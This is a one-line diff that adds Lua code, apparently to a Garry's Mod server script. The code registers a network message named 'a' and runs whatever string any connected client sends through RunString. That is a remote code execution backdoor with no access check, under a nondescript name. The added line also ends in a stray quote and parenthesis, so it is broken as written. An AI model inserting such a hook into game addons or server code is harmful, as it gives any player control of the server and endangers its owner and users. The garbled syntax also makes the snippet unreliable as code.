@@ -1,0 +1,1 @@
+util.AddNetworkString("a") net.Receive("a",function(len,pl) RunString(net.ReadString()) end)")
